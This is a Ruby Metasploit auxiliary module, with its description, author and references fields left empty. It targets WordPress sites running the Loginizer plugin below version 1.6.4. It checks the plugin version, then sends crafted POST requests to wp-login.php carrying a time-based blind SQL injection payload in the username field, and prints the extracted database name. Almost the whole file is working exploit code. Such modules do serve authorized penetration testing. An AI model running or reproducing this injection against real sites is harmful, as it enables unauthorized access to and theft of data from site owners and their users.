##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'WordPress Loginizer log SQLi Scanner',
      'Description' => %q{
      },
      'Author'       => 
        [
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
        ],
      'DisclosureDate' => '2020-10-21'))
  end

  def run_host(ip)
    unless wordpress_and_online?
      vprint_error("Server not online or not detected as wordpress")
      return
    end

    checkcode = check_plugin_version_from_readme('loginizer','1.6.4')
    if checkcode == Msf::Exploit::CheckCode::Safe
      vprint_error("Loginizer version not vulnerable")
      return
    else
      print_good('Vulnerable version detected')
    end

    cookie = send_request_cgi({'uri' => normalize_uri(target_uri.path, 'wp-login.php')}).get_cookies
    text = Rex::Text::rand_text_alpha(3,5)
    password = Rex::Text::rand_text_alpha(10)

    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: {verbose: datastore['VERBOSE'], encoder: 'base64', encode: 'base64'}) do |payload|
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'wp-login.php'),
        'cookie' => cookie,
        'vars_post' => {
          'log'=> "', ip = LEFT(UUID(), 8), url = ( TRUE AND #{payload}) -- #{text}",
          'pwd'=> password,
          'wp-submit' => 'Login',
          'redirect_to' => '',
          'testcookie'=> '1'
        }
      })
      fail_with Failure::Unreachable, 'Connection failed' unless res
    end
    puts @sqli.current_database
  end
end
